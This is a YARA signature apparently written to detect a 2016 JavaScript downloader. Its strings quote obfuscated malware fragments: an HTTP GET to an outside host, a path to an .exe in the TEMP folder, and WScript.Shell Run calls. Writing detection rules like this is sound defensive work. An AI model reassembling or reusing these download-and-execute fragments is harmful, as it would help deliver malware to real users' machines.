rule sig_20160330_e63ba823a9e1fdf6f8791fee5b298934 {
  meta:
    description = "datamaliciousorder - file 20160330_e63ba823a9e1fdf6f8791fee5b298934.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c48a7b5d62114d725d2638fda07aba4a28d9427413b0f11e27eab0085709f5d9"

  strings:
    $s1  = "_W[_OP](\"GET\", \"http://assura-courtage.org/j2osla\", false);" fullword ascii
    $s2  = "function _NI(_TZ, _BY){_IC = _IC * 1; return _TZ - _BY;};" fullword ascii
    $s3  = "var _M0 = function _S() {return WScript[_HC](\"WScript\"+\".Shell\");}(), _QU = 11;" fullword ascii
    $s4  = "if (_W[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _EL(){return _XP + \"\";};" fullword ascii
    $s6  = "function _B() {return _M0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"3YuuXATiI1R.ex\" + \"e\";};" fullword ascii
    $s7  = "function _B0(_JI){_M0[\"Run\"](_JI, _IC, _IC);};" fullword ascii
    $s8  = "function _RX() {return ((_KW == true) && (_KW == _F)) ? 1 : _IC;};" fullword ascii
    $s9  = "function _LM(){return 22;};" fullword ascii
    $s10 = " while (_T){" fullword ascii
    $s11 = "return _NI(_AI, _Q);" fullword ascii
    $s12 = "function _H(){return _HC;};" fullword ascii
    $s13 = "var _CP = new this[\"Date\"]();" fullword ascii
    $s14 = "function _OB()" fullword ascii
    $s15 = "function _PY(_QM) {var _GY = (1, 2, 3, 4, 5, _QM); return _GY;};" fullword ascii
    $s16 = "_F = true; " fullword ascii
    $s17 = "var _KW = false;" fullword ascii
    $s18 = "var _KS = false;" fullword ascii
    $s19 = "_KW = true; " fullword ascii
    $s20 = "} catch(_ZP){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}